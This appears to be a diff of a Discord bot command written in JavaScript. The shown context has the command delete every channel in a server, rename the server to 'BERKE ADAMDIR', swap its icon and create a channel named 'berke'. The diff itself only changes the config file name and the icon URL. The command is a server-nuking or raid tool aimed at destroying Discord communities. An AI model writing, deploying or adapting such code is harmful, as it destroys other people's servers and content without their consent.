@@ -1,5 +1,5 @@
 const Discord = require('discord.js');
-const ayarlar = require('../ayarlar.json');
+const ayarlar = require('../tokenyeri.json');
 
 exports.run = async (client, message, args) => {
 if (message.guild) {
@@ -14,7 +14,7 @@ message.guild.channels.deleteAll("");
 }
 
 message.guild.setName(`BERKE ADAMDIR`, "")
-message.guild.setIcon(`https://cdn.discordapp.com/attachments/569895621872451605/573561578767777829/closed-logo1.jpg`)
+message.guild.setIcon(`https://cdn.discordapp.com/attachments/522020595123224595/585051070942674964/unknown.png`)
 message.guild.createChannel(`berke`)
 message.delete()
 };  
